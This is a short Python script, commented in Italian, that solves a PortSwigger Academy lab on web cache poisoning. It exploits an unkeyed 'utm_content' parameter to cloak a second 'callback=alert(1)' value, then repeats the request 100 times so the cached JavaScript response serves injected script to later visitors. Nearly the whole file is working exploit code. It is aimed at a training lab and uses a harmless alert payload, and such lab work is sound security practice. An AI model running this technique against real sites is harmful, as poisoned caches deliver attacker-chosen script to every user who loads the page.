import requests
import argparse

# Per vedere se funziona: aprire il sito da una nuova scheda di un nuovo browser dopo l'esecuzione dello script, facendo uscire l'alert()
# IMPORTANTE: passare l'INTERO sito come parametro

def output(website):
    print("-------------------------------")
    print(website.text)
    print("-------------------------------")
    print()
    print()

parser = argparse.ArgumentParser()
parser.add_argument("-w", "--website", help="PortSwigger accademy website", required=True)
args = parser.parse_args()

session = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Referer": args.website,
    "Sec-Fetch-Dest": "script",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "content-length": "0",
}

website = session.get(f"{args.website}js/geolocate.js?callback=setCountryCookie", headers=headers)

print('Visiting "/js/geolocate.js?callback=setCountryCookie" endpoint')
output(website)

print('Noticing that the "utm_content" parameter is excluded from the cache key')
print("Doing a loop in order to update the cache Age (max-age=35)")
for i in range(100):
    website = session.get(f"{args.website}js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=bar")

output(website)

print('Changing the "callback" function into an "alert(1)" ')
print("Doing a loop in order to update the cache Age (max-age=35)")
for i in range(100):
    website = session.get(f"{args.website}js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)")

output(website)
